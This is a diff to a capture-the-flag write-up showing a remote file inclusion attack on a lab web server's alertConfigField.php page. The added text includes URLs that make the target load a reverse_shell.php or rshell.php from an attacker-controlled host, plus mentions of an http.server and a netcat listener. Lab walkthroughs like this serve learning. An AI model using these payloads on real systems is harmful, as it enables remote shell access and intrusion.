@@ -114,10 +114,23 @@ Reveals into this:
 
 At this point, we can safely assume that RFI (remote file inclusion) is also possible, and i got stuck in this point.
 
+We will now craft the RFI section of the vuln:
 
+`http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.48.47:8080/reverse_shell.php?`
 
-http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.48.47:8080/reverse_shell.php?
+With which we will create a file in our local directory:
 
+![](../../img/Pasted%20image%2020220827221852.png)
+
+![](../../img/Pasted%20image%2020220827221902.png)
+
+We will create a http.server on port 80 and netcat:
+
+![](../../img/Pasted%20image%2020220827221934.png)
+
+![](../../img/Pasted%20image%2020220827221945.png)
+
+Then, after performing this link, we can now see that the 
 
 http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.109.169/rshell.php
 
